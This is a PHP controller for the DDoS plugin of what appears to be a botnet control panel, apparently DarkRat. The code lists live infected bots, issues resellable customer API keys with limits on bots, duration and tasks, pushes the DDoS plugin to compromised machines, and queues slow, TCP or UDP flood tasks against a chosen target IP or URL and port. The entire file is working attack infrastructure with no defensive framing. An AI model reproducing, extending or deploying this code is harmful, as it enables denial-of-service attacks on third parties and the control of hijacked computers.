<?php

class ddosController
{

    public function __construct()
    {
        $GLOBALS["template"][0] = get_plugin_base_dir("ddos") . "/template/ddos";
    }

    public function ddosinfo()
    {
        $GLOBALS["template"][1] = "ddosinfo";
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ?");
        $statement->execute(array(time() - 5));
        $bots = array();
        while ($row = $statement->fetch()) {
            $bots[] = $row;
        }
        $GLOBALS["tpl"]->assign("bots", $bots);
    }

    private function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public function ddoshub()
    {
        $GLOBALS["template"][1] = "ddoshub";

        if(!empty($_POST["unloadclientfromplugin"]) && !empty($_POST["id"])){
            $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET active = ? WHERE id = ?");
            $statement->execute(array(2, $_POST["id"]));
        }

        if (!empty($_POST["maxbots"])) {
            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_apis (apikey, created_by_user, infotype, max_bots_per_task, max_time_per_task,max_tasks,active) VALUES (?, ?, ?, ?, ?, ?, ?)");
            if($_POST["active"] == "on"){
                $_POST["active"] = 1;
            }else{
                $_POST["active"] = 0;
            }
            foreach ($_POST as $key => $toint){
                $_POST[$key] = intval($toint);
            }
            $statement->execute(array($this->generateRandomString(35), $_SESSION["darkrat_userid"], "customer",  $_POST["maxbots"],$_POST["maxtime"], $_POST["maxtasks"], $_POST["active"]));

            header("Location: /ddos");


        }

        if (!empty($_POST["load-ddosBots"])) {

            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit, created_by, origin_from) VALUES (?, ?, ?, ?, ?, ?, ?)");
            $statement->execute(array("", 1, $GLOBALS["task_configuration"]["ddos"]["value"], "runplugin", $_POST["load-ddosBots"],$_SESSION["darkrat_userid"],"user"));
            header("Location: /ddos");
        }

        if (!empty($_POST["method"])) {
            if ($_POST["method"] == "slow") {
                if (filter_var($_POST["targetip"], FILTER_VALIDATE_URL) === FALSE) {
                    die('Not a valid URL');
                }
            }
            if ($_POST["method"] == "tcp" || $_POST["method"] == "udp") {
                if (filter_var($_POST["targetip"], FILTER_VALIDATE_IP) === FALSE) {
                    //   die('Not a valid IP');
                }
            }
            if (!is_int(intval($_POST["maxtime"]))) {
                die("Time has to be a Number");
            }
            if (!is_int(intval($_POST["targetport"]))) {
                die("Port has to be a Number");
            }
            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status) VALUES (?, ?, ?, ?, ?)");
            $statement->execute(array($_POST["method"], $_POST["targetip"], $_POST["maxtime"], $_POST["targetport"], "active"));
        }

        if (!empty($_POST["changeTask"])) {
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks WHERE id = ?");
            $statement->execute(array($_POST["changeTask"]));
            $details = $statement->fetch();
            $status = 'active';
            if ($details["status"] == "active") {
                $status = 'none';
            }
            $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_tasks SET status = ? WHERE id = ?");
            $statement->execute(array($status, $_POST["changeTask"]));
            Header("Refresh:0;");
        }
        if (!empty($_POST["delete"])) {
            $statement = $GLOBALS["pdo"]->prepare("DELETE FROM ddos_tasks WHERE id = ?");
            $statement->execute(array($_POST["delete"]));
        }
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ?");
        $statement->execute(array(time() - 5));
        $bots = array();
        while ($row = $statement->fetch()) {
            $bots[] = $row;
        }



        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_apis");
        $statement->execute(array());
        $allApis = array();
        while ($row = $statement->fetch()) {
            $allApis[] = $row;
        }


        $statement = $GLOBALS["pdo"]->prepare("SELECT SUM(if(ddos_avalible.lastseen > ?, 1, 0)) as workingon,ddos_tasks.* FROM ddos_tasks 
                                               LEFT JOIN ddos_avalible on ddos_tasks.id = ddos_avalible.ddos_taskid GROUP by ddos_tasks.id ");
        $statement->execute(array(time() - 5));
        $tasks = array();
        while ($row = $statement->fetch()) {
            $tasks[] = $row;
        }

        $GLOBALS["tpl"]->assign("allApis", $allApis);
        $GLOBALS["tpl"]->assign("bots_count", count($bots));
        $GLOBALS["tpl"]->assign("bots", $bots);
        $GLOBALS["tpl"]->assign("tasks", $tasks);
    }

}